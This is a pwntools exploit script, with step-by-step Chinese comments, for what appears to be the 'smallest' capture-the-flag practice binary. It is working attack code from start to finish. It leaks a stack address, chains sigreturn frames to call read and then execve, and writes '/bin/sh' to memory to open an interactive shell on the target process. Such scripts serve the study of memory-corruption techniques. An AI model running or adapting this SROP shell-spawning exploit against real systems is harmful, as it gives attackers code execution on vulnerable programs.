from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./smallest')

start    = 0x4000B0
sys_read = 0x4000B3
syscall  = 0x4000BE

# 布置好栈为后续做准备
# 第一次设置好栈空间
payload1 = p64(start) * 3
p.send(payload1)
sleep(1) # 两次发送之间稍微停顿一下

# 第二次设置rax为1(函数返回值放在rax中, 因此可以通过这个设置系统中断为rt_sigreturn)
# 为使用write读取栈做准备
payload2 = '\xb3'
p.send(payload2)

# 第三次读取栈地址用于写入/bin/sh
stack = u64(p.recv()[8:16])

# SROP执行read函数, 并将rsp跳转到stack用于下一步SROP
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_read
frame1.rip = syscall
frame1.rsp = stack
frame1.rdi = 0
frame1.rsi = stack
frame1.rdx = 0x400
p.send(p64(start) + p64(sys_read) + bytes(frame1))
sleep(1) # 两次发送之间稍微停顿一下
p.send(p64(sys_read) + bytes(frame1)[:constants.SYS_rt_sigreturn - 8])

# SROP执行execve函数
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_execve
frame2.rip = syscall
frame2.rsp = 0
frame2.rdi = stack + len(bytes(frame2)) + 16
frame2.rsi = 0
frame2.rdx = 0
p.send(p64(start) + p64(sys_read) + bytes(frame2) + b'/bin/sh\x00')
sleep(1) # 两次发送之间稍微停顿一下
p.send(p64(sys_read) + bytes(frame1)[:constants.SYS_rt_sigreturn - 8])

p.interactive()
